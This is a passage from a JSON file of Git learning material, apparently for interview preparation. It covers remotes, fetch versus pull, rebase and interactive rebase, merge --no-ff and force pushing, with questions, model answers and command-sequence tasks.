the sequence of changes. **Caution:** Rebasing rewrites commit history, so it should generally be avoided on branches that have already been pushed to a shared remote repository, as it can cause significant issues for collaborators.\n*   **`git rebase -i HEAD~N` (Interactive Rebase):** The `-i` (interactive) option for `rebase` provides a powerful tool for sophisticated history rewriting. It allows you to modify a series of commits interactively, starting from `HEAD~N` (the last N commits). You can:\n    *   **Pick:** Use the commit as is.\n    *   **Reword:** Change the commit message.\n    *   **Edit:** Amend the commit (add/remove files, change content).\n    *   **Squash:** Combine multiple commits into a single one.\n    *   **Fixup:** Combine commits like squash, but discard the squashed commit's message.\n    *   **Drop:** Remove a commit entirely.\n    This is invaluable for cleaning up a feature branch before merging it into `main`, creating a cleaner, more concise history.",
          "examples": [
            {
              "id": "example_git_merge_1",
              "title": "Merging 'feature-branch' into 'main'",
              "code": "git checkout main\ngit merge feature-branch",
              "explanation": "This sequence first switches to the `main` branch, then merges all changes from `feature-branch` into `main`. If `feature-branch` diverged, a new merge commit will be created on `main`.",
              "language": "bash"
            },
            {
              "id": "example_git_merge_no_ff_1",
              "title": "Merging 'hotfix' with --no-ff",
              "code": "git checkout main\ngit merge --no-ff hotfix",
              "explanation": "Even if `main` could fast-forward to `hotfix`, this command explicitly creates a merge commit, preserving a clear record of the `hotfix` branch's integration point.",
              "language": "bash"
            },
            {
              "id": "example_git_rebase_1",
              "title": "Rebasing 'feature-branch' onto 'main'",
              "code": "git checkout feature-branch\ngit rebase main",
              "explanation": "This command moves the base of `feature-branch` to the current tip of `main`. All commits unique to `feature-branch` will be re-applied on top of `main`'s latest history, creating a linear history.",
              "language": "bash"
            },
            {
              "id": "example_git_rebase_interactive_1",
              "title": "Interactive rebase for last 3 commits",
              "code": "git rebase -i HEAD~3\n\n# This opens an editor with a list of commits like:\n# pick abcdef1 Commit 1\n# pick 2345678 Commit 2\n# pick 90abcdef Commit 3\n\n# You can then change 'pick' to 'squash', 'reword', etc.",
              "explanation": "This command allows you to interactively edit, reorder, squash, or drop the last three commits in your current branch, enabling a clean and concise history before merging.",
              "language": "bash"
            }
          ],
          "relatedQuestions": [
            "question_git_merge_rebase_diff_1",
            "question_git_merge_no_ff_1",
            "question_git_rebase_public_1",
            "question_git_interactive_rebase_1",
            "question_git_rebase_use_case_1"
          ],
          "relatedTasks": [
            "task_git_clean_feature_history",
            "task_git_integrate_and_push"
          ],
          "tags": [
            "Git",
            "Merge",
            "Rebase",
            "History",
            "Linear History",
            "Collaboration",
            "Clean History"
          ],
          "technology": "Git",
          "prerequisites": [
            "git_branching_basics",
            "git_remote_sync"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "requiredFor": [
            "complex_git_workflows",
            "senior_dev_practices",
            "code_review_process"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_git_remote_add_1",
          "topic": "Git Remote Management",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary purpose of the `git remote add <name> <url>` command?",
          "answer": "To connect your local repository to a remote repository by giving it a short, memorable name.",
          "analysisPoints": [
            "Tests basic understanding of `git remote add`.",
            "Emphasizes the function of associating a name with a URL."
          ],
          "keyConcepts": [
            "git remote add",
            "remote repository",
            "local repository",
            "remote name",
            "remote URL"
          ],
          "evaluationCriteria": [
            "Ability to recall command purpose",
            "Understanding of remote concept"
          ],
          "example": null,
          "tags": [
            "Git",
            "Remote",
            "Basic"
          ],
          "prerequisites": [
            "git_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_remote_v_1",
          "topic": "Git Remote Management",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following commands is used to view the list of configured remote repositories along with their URLs?",
          "answer": "git remote -v",
          "options": [
            "git remote show",
            "git remote list",
            "git remote -v",
            "git config --list"
          ],
          "analysisPoints": [
            "Tests knowledge of specific Git commands.",
            "Distinguishes `git remote -v` from other related but incorrect commands."
          ],
          "keyConcepts": [
            "git remote -v",
            "view remotes",
            "remote URL"
          ],
          "evaluationCriteria": [
            "Command recall",
            "Understanding of flags"
          ],
          "example": "The `-v` flag stands for 'verbose' and provides more details, specifically the fetch and push URLs for each remote.",
          "tags": [
            "Git",
            "Remote",
            "Command Line"
          ],
          "prerequisites": [
            "git_remote_management"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_git_remote_add_explain_1",
          "topic": "Git Remote Management",
          "level": "medium",
          "type": "open",
          "question": "You've just initialized a new local Git repository. Explain the steps and commands required to link it to an existing empty remote repository on GitHub, making sure you can both push and pull changes. Assume the remote repository URL is `https://github.com/your-username/your-project.git`.",
          "answer": "First, you would initialize the local directory as a Git repository: `git init`. \nThen, you would add the remote repository. The conventional name for the primary remote is `origin`, so you would use: `git remote add origin https://github.com/your-username/your-project.git`. \nOptionally, you might want to create an initial commit and push it. This usually involves creating a `README.md` file, staging it (`git add README.md`), committing it (`git commit -m \"Initial commit\"`), and then pushing the `main` (or `master`) branch to the `origin` remote: `git push -u origin main`. The `-u` flag sets the upstream branch, so subsequent `git push` and `git pull` commands don't require specifying the remote and branch.",
          "analysisPoints": [
            "Tests sequential command application.",
            "Evaluates understanding of typical initial repository setup.",
            "Checks knowledge of `git init`, `git remote add`, `git add`, `git commit`, and `git push -u`.",
            "Assesses understanding of `origin` as a conventional remote name."
          ],
          "keyConcepts": [
            "git init",
            "git remote add",
            "git push -u",
            "initial setup",
            "remote connection"
          ],
          "evaluationCriteria": [
            "Workflow understanding",
            "Command sequencing",
            "Purpose of each command"
          ],
          "example": null,
          "tags": [
            "Git",
            "Remote",
            "Setup",
            "Workflow"
          ],
          "prerequisites": [
            "git_remote_management"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_remote_multiple_1",
          "topic": "Git Remote Management",
          "level": "medium",
          "type": "open",
          "question": "In what scenario would a developer typically need to configure multiple remote repositories (e.g., `origin` and `upstream`) for a single local repository? Provide an example with commands.",
          "answer": "A common scenario for configuring multiple remotes is when contributing to an open-source project. Typically:\n\n*   `origin` refers to your personal fork of the project on GitHub (or another hosting service), where you push your changes.\n*   `upstream` refers to the original main project repository, from which you pull the latest changes.\n\nThis setup allows you to easily synchronize with the main project's updates while keeping your own fork updated and pushing your contributions to your `origin` before submitting a pull request.\n\n**Example Commands:**\n\n```bash\n# 1. Initial clone of your fork (creates 'origin')\ngit clone https://github.com/your-username/project-fork.git\ncd project-fork\n\n# 2. Add the original project as 'upstream'\ngit remote add upstream https://github.com/original-org/project.git\n\n# 3. Verify remotes\ngit remote -v\n# Output:\n# origin    https://github.com/your-username/project-fork.git (fetch)\n# origin    https://github.com/your-username/project-fork.git (push)\n# upstream  https://github.com/original-org/project.git (fetch)\n# upstream  https://github.com/original-org/project.git (push)\n\n# To fetch latest changes from the original project:\ngit fetch upstream\n\n# To merge changes from upstream/main into your local main branch:\ngit pull upstream main\n\n# To push your local changes to your fork:\ngit push origin main\n```",
          "analysisPoints": [
            "Identifies a real-world use case for multiple remotes (open-source contribution).",
            "Explains the roles of `origin` and `upstream`.",
            "Provides concrete commands demonstrating the setup and usage."
          ],
          "keyConcepts": [
            "multiple remotes",
            "open source contribution",
            "forking workflow",
            "origin",
            "upstream"
          ],
          "evaluationCriteria": [
            "Scenario identification",
            "Command application",
            "Workflow explanation"
          ],
          "example": null,
          "tags": [
            "Git",
            "Remote",
            "Collaboration",
            "Advanced",
            "Workflow"
          ],
          "prerequisites": [
            "git_remote_management"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_fetch_pull_1",
          "topic": "Git Remote Synchronization",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Git commands:\n\n1.  `git fetch origin`\n2.  `git pull origin main`\n\nWhich statement accurately describes the key difference between these two commands?",
          "answer": "`git fetch` downloads changes to your local repository without merging, while `git pull` downloads and then automatically merges the changes into your current branch.",
          "options": [
            "`git fetch` only works with the `origin` remote, whereas `git pull` can work with any remote.",
            "`git pull` only downloads commit history, while `git fetch` updates your working directory.",
            "`git fetch` downloads changes to your local repository without merging, while `git pull` downloads and then automatically merges the changes into your current branch.",
            "`git fetch` is deprecated and `git pull` should always be used instead."
          ],
          "analysisPoints": [
            "Highlights the core difference: `fetch` updates remote-tracking branches, `pull` updates working branch.",
            "Correctly identifies `pull` as `fetch + merge`.",
            "Debunks common misconceptions (fetch working directory, fetch deprecation)."
          ],
          "keyConcepts": [
            "git fetch",
            "git pull",
            "merge",
            "remote-tracking branches",
            "working directory"
          ],
          "evaluationCriteria": [
            "Understanding of command effects",
            "Distinction between download and integration",
            "Accuracy of conceptual understanding"
          ],
          "example": "If you just want to see what's new on the remote without altering your current work, `git fetch` is the command to use. If you want to incorporate those changes immediately into your current branch, `git pull` is appropriate.",
          "tags": [
            "Git",
            "Fetch",
            "Pull",
            "Synchronization"
          ],
          "prerequisites": [
            "git_remote_sync"
          ],
          "complexity": 5,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_pull_rebase_adv_1",
          "topic": "Git Remote Synchronization",
          "level": "hard",
          "type": "open",
          "question": "You are working on a feature branch (`feat/new-ui`) and have made several commits locally. The `main` branch has also evolved significantly since you started your feature. You want to bring the latest changes from `main` into your `feat/new-ui` branch, but you also want to maintain a clean, linear commit history without extra merge commits when your feature branch is eventually merged. What Git command would you use to achieve this, and why is it generally preferred over a simple `git pull` in this scenario?",
          "answer": "You should use `git pull --rebase origin main` (assuming `origin` is your remote and `main` is the branch to pull from).\n\n**Explanation:**\n\n*   A simple `git pull origin main` would perform a `git fetch origin` followed by `git merge origin/main` into your `feat/new-ui` branch. If there are divergent histories (which is likely if `main` has evolved), this would create a new merge commit in your `feat/new-ui` branch. While this is functional, it can clutter the history with merge commits, especially if you pull `main` frequently.\n\n*   `git pull --rebase origin main`, on the other hand, performs a `git fetch origin` followed by a `git rebase origin/main`.\n    *   It fetches the latest changes from `origin/main`.\n    *   Then, it takes your local commits on `feat/new-ui` (those not on `origin/main`) and temporarily 'saves' them.\n    *   It updates your `feat/new-ui` branch to the latest `origin/main`.\n    *   Finally, it 'reapplies' your saved local commits on top of the newly updated `feat/new-ui` branch.\n\n**Why it's preferred:**\n*   **Linear History:** It results in a clean, linear project history without unnecessary merge commits. This makes the commit graph easier to read and understand, as it appears as if your changes were made directly on top of the latest `main` branch.\n*   **Cleaner Feature Branch:** When your `feat/new-ui` branch is eventually merged into `main` (often via a pull request), it can be merged with a simple fast-forward (if `main` didn't change while your feature was under review) or a squash merge, resulting in a cleaner `main` branch history.",
          "analysisPoints": [
            "Identifies the correct command (`git pull --rebase`).",
            "Explains the mechanism of `git pull --rebase` (fetch + rebase).",
            "Articulates the benefits: linear history, cleaner feature branch, easier to understand history.",
            "Compares explicitly with `git pull` (merge) and explains its drawbacks in this context."
          ],
          "keyConcepts": [
            "git pull --rebase",
            "linear history",
            "merge commits",
            "rebase workflow",
            "feature branching"
          ],
          "evaluationCriteria": [
            "Command selection accuracy",
            "Detailed explanation of command behavior",
            "Justification of preference",
            "Understanding of Git history implications"
          ],
          "example": null,
          "tags": [
            "Git",
            "Pull",
            "Rebase",
            "Workflow",
            "Advanced",
            "History"
          ],
          "prerequisites": [
            "git_remote_sync",
            "git_history_management"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_push_upstream_1",
          "topic": "Git Remote Synchronization",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the purpose of the `-u` or `--set-upstream` flag when using `git push` for the first time on a new branch (e.g., `git push -u origin feature-branch`)?",
          "answer": "The `-u` or `--set-upstream` flag sets the upstream (tracking) reference for the current local branch. This means that subsequent `git pull` or `git push` commands can be used without specifying the remote and branch (e.g., `git pull` or `git push`) because Git remembers that `origin/feature-branch` is the corresponding remote branch.",
          "analysisPoints": [
            "Tests knowledge of `git push -u`.",
            "Explains the 'upstream' concept and its convenience."
          ],
          "keyConcepts": [
            "git push -u",
            "set upstream",
            "tracking branch",
            "remote tracking"
          ],
          "evaluationCriteria": [
            "Command option understanding",
            "Practical workflow benefit"
          ],
          "example": null,
          "tags": [
            "Git",
            "Push",
            "Upstream",
            "Convenience"
          ],
          "prerequisites": [
            "git_remote_sync"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_sync_scenario_1",
          "topic": "Git Remote Synchronization",
          "level": "medium",
          "type": "code",
          "question": "You're collaborating on a project. You've made some local commits on your `feature-x` branch. Before pushing, you want to ensure your feature branch is up-to-date with the `main` branch of the `origin` remote, but without merging `main` into your `feature-x` directly. Then, you want to push your `feature-x` branch to `origin`. Provide the sequence of Git commands you would use.",
          "answer": "```bash\n# 1. Ensure you are on your feature branch\ngit checkout feature-x\n\n# 2. Fetch all latest changes from the origin remote\ngit fetch origin\n\n# 3. Rebase your feature-x branch onto the latest main from origin\n# This ensures your commits appear after main's latest commits, creating a linear history\ngit rebase origin/main\n\n# 4. Push your feature-x branch to the origin remote\n# Assuming this is the first push, you might use -u\ngit push -u origin feature-x\n\n# If you've already pushed and rebased, you might need --force-with-lease (or --force) \n# due to rewritten history, but this should be done with caution:\n# git push --force-with-lease origin feature-x\n```",
          "analysisPoints": [
            "Tests understanding of syncing without direct merge.",
            "Requires knowledge of `git fetch` and `git rebase` sequence.",
            "Includes the push command for completion.",
            "Mentions caution with `git push --force` or `--force-with-lease` after rebase."
          ],
          "keyConcepts": [
            "git fetch",
            "git rebase",
            "git push",
            "linear history",
            "feature branch workflow"
          ],
          "evaluationCriteria": [
            "Correct command sequence",
            "Logical reasoning for each step",
            "Handling of rewritten history"
          ],
          "example": null,
          "tags": [
            "Git",
            "Workflow",
            "Synchronization",
            "Rebase",
            "Push"
          ],
          "prerequisites": [
            "git_remote_sync",
            "git_history_management"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_push_force_1",
          "topic": "Git Remote Synchronization",
          "level": "hard",
          "type": "open",
          "question": "Explain when and why `git push --force` (or `git push --force-with-lease`) might be necessary, and discuss the potential dangers or downsides of using it. In what specific scenarios would it be acceptable or even recommended?",
          "answer": "`git push --force` (or its safer counterpart, `git push --force-with-lease`) is necessary when you have rewritten history locally (e.g., via `git rebase`, `git commit --amend`, `git filter-branch`, or `git reset --hard` followed by new commits) and you want to overwrite the remote branch's history with your new local history. A regular `git push` would fail because your local branch is no longer a fast-forward of the remote branch.\n\n**Why it's necessary:**\n*   To overwrite a remote branch's history after a local rebase (e.g., tidying up commits on a feature branch before merging).\n*   To correct a commit that was pushed with sensitive information.\n*   To recover from accidental merges or commits on the wrong branch.\n\n**Potential Dangers/Downsides:**\n*   **Data Loss for Collaborators:** If other developers have pulled the original history and based their work on it, a forced push will overwrite that history. When they try to pull or push, their local history will diverge, leading to complex merge conflicts or requiring them to reset their local branches and potentially lose work.\n*   **Breaking Others' Workflows:** It can cause significant disruption in a shared development environment, requiring others to rebase or reset their branches, which is tedious and error-prone.\n\n**Acceptable/Recommended Scenarios:**\n*   **Private Feature Branches:** When working on a feature branch that has not yet been shared with anyone, or if you are the *only* person working on that branch on the remote. This allows you to clean up your commit history (e.g., squashing commits, reordering) before merging into a main branch.\n*   **Correcting Mistakes Immediately:** In very small, tightly coupled teams where communication is instant, and everyone is aware of the forced push and can immediately react (e.g., `git fetch origin; git reset --hard origin/my-branch`).\n*   **Pre-configured CI/CD:** Some CI/CD pipelines might specifically expect or handle forced pushes on certain branches for specific automated tasks.\n\n**`--force-with-lease` vs. `--force`:**\n`--force-with-lease` is generally preferred because it's safer. It only forces the push if the remote branch is exactly what you expect it to be (i.e., no one else has pushed to it since your last fetch). If the remote branch has changed, `--force-with-lease` will fail, preventing accidental overwrites of someone else's work. `--force` (or `-f`) will overwrite regardless of recent remote changes.",
          "analysisPoints": [
            "Defines the purpose and necessity of `git push --force`.",
            "Elaborates on the serious risks, particularly for collaboration.",
            "Identifies specific, acceptable use cases (private branches, immediate correction).",
            "Explains the crucial difference and benefit of `--force-with-lease`."
          ],
          "keyConcepts": [
            "git push --force",
            "git push --force-with-lease",
            "rewriting history",
            "rebase",
            "collaboration",
            "data loss",
            "shared history"
          ],
          "evaluationCriteria": [
            "Comprehensive explanation of command mechanics and implications",
            "Demonstrates understanding of collaborative pitfalls",
            "Ability to distinguish safe vs. unsafe usage",
            "Knowledge of `--force-with-lease`."
          ],
          "example": null,
          "tags": [
            "Git",
            "Push",
            "Force Push",
            "Rebase",
            "Collaboration",
            "Advanced",
            "Best Practices"
          ],
          "prerequisites": [
            "git_remote_sync",
            "git_history_management"
          ],
          "complexity": 9,
          "interviewFrequency": 7,
          "learningPath": "expert"
        },
        {
          "id": "question_git_merge_rebase_diff_1",
          "topic": "Git History Management",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following statements BEST describes the primary difference between `git merge` and `git rebase` when integrating changes from one branch into another?",
          "answer": "`git merge` creates a new merge commit to combine histories, preserving the original commit graph, while `git rebase` rewrites history by moving commits to a new base, resulting in a linear history.",
          "options": [
            "`git merge` is used for local branches, while `git rebase` is used for remote branches.",
            "`git merge` only combines changes from the same branch, while `git rebase` combines changes from different branches.",
            "`git merge` creates a new merge commit to combine histories, preserving the original commit graph, while `git rebase` rewrites history by moving commits to a new base, resulting in a linear history.",
            "`git rebase` is always safer than `git merge` as it avoids conflicts."
          ],
          "analysisPoints": [
            "Clearly defines the core historical impact of merge vs. rebase.",
            "Highlights 'new merge commit' vs. 'rewrites history' and 'linear history'.",
            "Correctly identifies the preservation aspect of merge and the rewriting aspect of rebase.",
            "Discards incorrect assumptions about safety or branch scope."
          ],
          "keyConcepts": [
            "git merge",
            "git rebase",
            "merge commit",
            "linear history",
            "history rewrite",
            "commit graph"
          ],
          "evaluationCriteria": [
            "Accurate comparison of core functionality",
            "Understanding of history implications",
            "Distinction of output history structure"
          ],
          "example": "If you value an accurate historical record of every branch's divergence and convergence, `merge` is generally preferred. If you prioritize a clean, straight-line history that looks like work was done sequentially, `rebase` is often chosen (especially for feature branches before integration).",
          "tags": [
            "Git",
            "Merge",
            "Rebase",
            "History",
            "Comparison"
          ],
          "prerequisites": [
            "git_history_management"
          ],
          "complexity": 6,
          "interviewFrequency": 10,
          "learningPath": "intermediate"
        },
        {
          "id": "question_git_merge_no_ff_1",
          "topic": "Git History Management",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose and effect of `git merge --no-ff <branch>`. In what kind of Git workflow is this option particularly useful?",
          "answer": "The `git merge --no-ff <branch>` command forces Git to always create a new merge commit, even if the integration could be performed as a 'fast-forward' merge. A fast-forward merge simply moves the current branch pointer forward to point to the tip of the merged branch, without creating a new commit, if the current branch is a direct ancestor of the branch being merged.\n\n**Purpose and Effect:**\nBy using `--no-ff`, you explicitly tell Git to perform a three-way merge, resulting in a distinct merge commit that clearly indicates the point at which a feature branch was integrated back into the main development line. This preserves the historical context of the feature branch and its existence, even after it's been merged.\n\n**Usefulness:**\nThis option is particularly useful in workflows where you want to retain a clear, explicit history of feature branches and their merge points, such as:\n*   **Feature Branch Workflow:** When you merge a completed feature branch into `main` (or `develop`), `--no-ff` ensures that the entire feature's commits are grouped and marked by a single merge commit, making it easy to see when a feature was integrated and potentially revert it if needed. It keeps a logical separation between the feature's development and its integration into the main line.\n*   **Release Management:** For release branches, explicitly merging with `--no-ff` helps to clearly mark release points and the integration of bug fixes or new features into that release line.\n*   **Auditing/Debugging:** A non-fast-forward merge commit provides a clear historical marker, which can be valuable for auditing, debugging, or understanding the project's evolution over time, as it shows precisely which commits were part of a specific feature or fix.",
          "analysisPoints": [
            "Defines `git merge --no-ff` and contrasts it with fast-forward.",
            "Explains the effect: explicit merge commit, preserving branch history.",
            "Identifies practical scenarios where it's useful (feature branch workflow, release management, auditing).",
            "Highlights the benefit of clear historical markers."
          ],
          "keyConcepts": [
            "git merge --no-ff",
            "fast-forward merge",
            "merge commit",
            "feature branch workflow",
            "release management",
            "history preservation"
          ],
          "evaluationCriteria": [
            "Accurate definition of command",
            "Clear explanation of its impact on history",
            "Identification of relevant use cases and benefits"
          ],
          "example": null,
          "tags": [
            "Git",
            "Merge",
            "History",
            "Workflow",
            "Best Practices"
          ],
          "prerequisites": [
            "git_history_management"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_rebase_public_1",
          "topic": "Git History Management",
          "level": "hard",
          "type": "open",
          "question": "It is a commonly cited best practice that you should \"never rebase a public branch\" or \"never rebase history that others have pulled.\" Explain why this rule exists and what problems it aims to prevent for a development team.",
          "answer": "The rule \"never rebase a public branch\" or \"never rebase history that others have pulled\" is crucial because `git rebase` rewrites commit history. It doesn't just add new commits; it creates new commits with new SHA-1 hashes for the commits being rebased, effectively replacing the original commits.\n\n**Problems it aims to prevent:**\n\n1.  **Divergent Histories and Merge Conflicts:** If you rebase a branch that others have already pulled and based their work on, their local copy still points to the 'old' (pre-rebase) commits. When they try to `git pull` your rebased changes, Git sees two separate histories for the 'same' branch. This results in complex, confusing merge conflicts (`non-fast-forward` error on push, or extraneous merges on pull).\n\n2.  **Loss of Work/Tedious Resolution:** Collaborators will be forced to either:\n    *   `git reset --hard` to match the rebased remote, potentially losing their uncommitted or unpushed local work that was based on the old history.\n    *   Manually rebase their own work on top of your rebased branch, which can be a difficult and error-prone process, especially for multiple people.\n\n3.  **Confusion and Frustration:** It leads to a very frustrating experience for team members who suddenly find their local repository out of sync and difficult to update, often without clear guidance on how to resolve it.\n\n4.  **Loss of Traceability:** If commits are rebased and squashed, the original individual commits and their context might be lost, making debugging or auditing more difficult.\n\n**In summary:** Rebasing public history essentially pulls the rug out from under your collaborators' feet. It breaks the shared understanding of the project's timeline and forces everyone to synchronize their work with a newly created history, causing workflow disruption and potential data loss. This rule emphasizes protecting shared history and enabling smooth collaboration.",
          "analysisPoints": [
            "Explains that rebase rewrites history by creating new commit SHAs.",
            "Details the direct consequences: divergent histories, merge conflicts, non-fast-forward errors.",
            "Highlights the impact on collaborators: potential data loss, tedious resolution.",
            "Emphasizes the human element: confusion, frustration.",
            "Summarizes the rule's purpose: protecting shared history and enabling collaboration."
          ],
          "keyConcepts": [
            "git rebase",
            "public branch",
            "rewriting history",
            "divergent history",
            "collaboration",
            "merge conflicts",
            "data integrity"
          ],
          "evaluationCriteria": [
            "Thorough explanation of technical reasons and social consequences",
            "Understanding of distributed version control principles",
            "Ability to articulate best practices and their justification"
          ],
          "example": null,
          "tags": [
            "Git",
            "Rebase",
            "Best Practices",
            "Collaboration",
            "Advanced",
            "History"
          ],
          "prerequisites": [
            "git_history_management",
            "git_remote_sync"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_git_interactive_rebase_1",
          "topic": "Git History Management",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the primary utility of `git rebase -i` (interactive rebase), and name at least three common operations you can perform with it?",
          "answer": "`git rebase -i` allows you to interactively rewrite a range of commits in your local history, primarily for cleaning up and organizing commits before sharing them. Common operations include:\n1.  **squash/fixup:** Combine multiple commits into a single commit.\n2.  **reword:** Change commit messages.\n3.  **edit:** Modify the contents of a commit or split it into multiple commits.\n4.  **drop:** Delete a commit.",
          "analysisPoints": [
            "Defines the core purpose (interactive history rewriting/cleanup).",
            "Lists common and powerful operations.",
            "Emphasizes its use for cleaning history before sharing."
          ],
          "keyConcepts": [
            "git rebase -i",
            "interactive rebase",
            "squash",
            "reword",
            "edit commit",
            "drop commit",
            "history cleanup"
          ],
          "evaluationCriteria": [
            "Command purpose recall",
            "Knowledge of interactive rebase operations"
          ],
          "example": null,
          "tags": [
            "Git",
            "Rebase",
            "History",
            "Advanced"
          ],
          "prerequisites": [
            "git_history_management"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_git_rebase_use_case_1",
          "topic": "Git History Management",
          "level": "medium",
          "type": "open",
          "question": "You have been working on a feature branch (`feature/login`) for a few days, making several small, incremental commits (e.g., \"WIP: styling\", \"Fix typo\", \"Add login form\"). Now that the feature is complete and working, you want to prepare it for a pull request to `main`. Describe how you would use Git to clean up and condense these commits into a single, meaningful commit that clearly describes the entire feature, and then push it.",
          "answer": "To clean up and condense multiple commits into a single meaningful one before a pull request, you would use `git rebase -i`.\n\n**Steps:**\n\n1.  **Switch to your feature branch:**\n    `git checkout feature/login`\n\n2.  **Determine the range of commits to squash:** You need to rebase back to the commit *before* your first commit for this feature. If you have 3 commits, you'd rebase `HEAD~3`. If you're unsure, `git log` can help identify the commit hash of the last commit on `main` before your feature started, and then you'd use `git rebase -i <commit-hash-of-main-before-feature>`.\n    Let's assume your last 3 commits are the ones for this feature:\n    `git rebase -i HEAD~3`\n\n3.  **Edit the rebase todo list:** This command will open your default text editor with a list of the commits you've selected, in reverse chronological order:\n    ```\n    pick abcdef1 WIP: styling\n    pick 2345678 Fix typo\n    pick 90abcdef Add login form\n    ```\n    To squash these into one, you would change `pick` to `squash` (or `s`) for all but the first commit. The first commit will be the base for the new combined commit.\n    ```\n    pick abcdef1 WIP: styling\n    squash 2345678 Fix typo\n    squash 90abcdef Add login form\n    ```\n\n4.  **Write the new commit message:** After saving and closing the editor, Git will open another editor for you to write the new, single commit message for the combined commits. You should write a clear, descriptive message like: \"feat: Implement user login functionality\".\n\n5.  **Push the rebased branch:** Since you have rewritten history, a normal `git push` will fail. You'll need to force push. However, it's safer to use `--force-with-lease` if you haven't pushed this branch publicly yet:\n    `git push --force-with-lease origin feature/login`\n    (If the branch was already pushed and others might have pulled it, a forced push is highly discouraged.)",
          "analysisPoints": [
            "Identifies `git rebase -i` as the correct tool.",
            "Provides a clear step-by-step process.",
            "Explains how to select commits for rebase (HEAD~N or specific hash).",
            "Demonstrates the interactive editor changes (pick, squash).",
            "Emphasizes writing a meaningful new commit message.",
            "Addresses the need for `git push --force-with-lease` due to rewritten history, with a warning."
          ],
          "keyConcepts": [
            "git rebase -i",
            "squash commits",
            "history cleanup",
            "pull request preparation",
            "force push"
          ],
          "evaluationCriteria": [
            "Practical application of interactive rebase",
            "Understanding of commit consolidation",
            "Awareness of history rewriting implications for pushing"
          ],
          "example": null,
          "tags": [
            "Git",
            "Rebase",
            "History",
            "Workflow",
            "Pull Request",
            "Advanced"
          ],
          "prerequisites": [
            "git_history_management",
            "git_remote_sync"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_git_init_and_remote",
          "title": "Initialize a New Project and Connect to Remote",
          "description": "\nAs a frontend developer, you often start new projects. For this task, simulate the process of initializing a new local Git repository, creating your first commit, and linking it to a remote GitHub repository. You will then push your initial code to the remote.\n\n**Requirements:**\n1.  Initialize a new Git repository in a directory named `my-new-frontend-app`.\n2.  Create a simple `index.html` file inside this directory with basic HTML content.\n3.  Add `index.html` to the staging area.\n4.  Create your first commit with a message like \"Initial commit: Basic HTML structure\".\n5.  Add a remote repository named `origin` with a placeholder URL (e.g., `https://github.com/your-username/my-new-frontend-app.git`).\n6.  Push your `main` branch to the `origin` remote, setting the upstream.\n7.  Verify that the remote is correctly configured.\n\nYour solution should be a sequence of Git commands.\n",
          "difficulty": "easy",
          "startingCode": "# Assume you are in the parent directory where 'my-new-frontend-app' will be created\n",
          "solutionCode": "mkdir my-new-frontend-app\ncd my-new-frontend-app\n\ngit init\n\necho \"<!DOCTYPE html>\\n<html>\\n<head><title>My App</title></head>\\n<body><h1>Hello, Frontend!</h1></body>\\n</html>\" > index.html\n\ngit add index.html\n\ngit commit -m \"Initial commit: Basic HTML structure\"\n\ngit remote add origin https://github.com/your-username/my-new-frontend-app.git\n\ngit branch -M main # Rename default branch to main if it's master\ngit push -u origin main\n\ngit remote -v",
          "testCases": [
            "Directory `my-new-frontend-app` exists.",
            "`index.html` exists inside the directory.",
            "Git repository initialized (`.git` directory exists).",
            "First commit exists with the specified message.",
            "Remote `origin` is added with the correct URL.",
            "The `main` branch is pushed to `origin` and upstream is set (verified by `git remote -v` showing `(push)` and `(fetch)` for `origin`)."
          ],
          "hints": [
            "Remember to navigate into your project directory after creating it.",
            "The `git branch -M main` command is useful if your default branch is `master` and you want to rename it to `main` before the first push.",
            "The `-u` flag for `git push` is essential for setting up upstream tracking."
          ],
          "tags": [
            "Git",
            "Initialization",
            "Remote",
            "Setup",
            "Beginner"
          ],
          "timeEstimate": 15,
          "prerequisites": [
            "git_basics",
            "command_line_basics"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "relatedConcepts": [
            "git_remote_management"
          ]
        },
        {
          "id": "task_git_sync_feature_branch",
          "title": "Synchronize Feature Branch with Main and Push",
          "description": "\nYou are working on a new feature (`feat/header`) in a team project. While you've been developing, the `main` branch has received several updates from other team members. Before creating a pull request for your feature, you want to integrate the latest `main` changes into your `feat/header` branch to avoid complex conflicts during the merge, and you want to maintain a clean, linear history. Finally, you need to push your updated feature branch.\n\n**Requirements:**\n1.  Assume you are currently on `feat/header` branch.\n2.  Fetch the latest changes from the `origin` remote.\n3.  Integrate the latest `main` branch changes into your `feat/header` branch using a method that ensures a linear history (no merge commits on `feat/header`).\n4.  Push your updated `feat/header` branch to the `origin` remote.\n\nProvide the sequence of Git commands you would execute.\n",
          "difficulty": "medium",
          "startingCode": "# Assume you are currently on 'feat/header' branch\n# and 'origin' is configured as your remote.\n# Your 'feat/header' branch has local commits.\n",
